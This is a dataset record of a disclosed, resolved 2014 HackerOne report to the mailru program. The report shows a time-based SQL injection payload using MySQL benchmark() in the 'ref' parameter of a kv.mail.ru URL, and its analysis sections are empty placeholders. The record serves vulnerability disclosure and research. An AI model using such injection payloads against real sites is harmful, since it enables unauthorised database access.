---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '9921'
original_report_id: '9921'
title: Time based sql injection
weakness: SQL Injection
team_handle: mailru
created_at: '2014-04-26T20:09:51.754Z'
disclosed_at: '2014-12-10T18:51:39.356Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- sql-injection
---

# Time based sql injection

## Metadata

- HackerOne Report ID: 9921
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2014-12-10T18:51:39.356Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Оригинальный запрос
http://kv.mail.ru/?ref=horde6

Запрос с задержкой
http://kv.mail.ru/?ref=horde6'%2bbenchmark(10000000%2csha1(1))%2b'

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
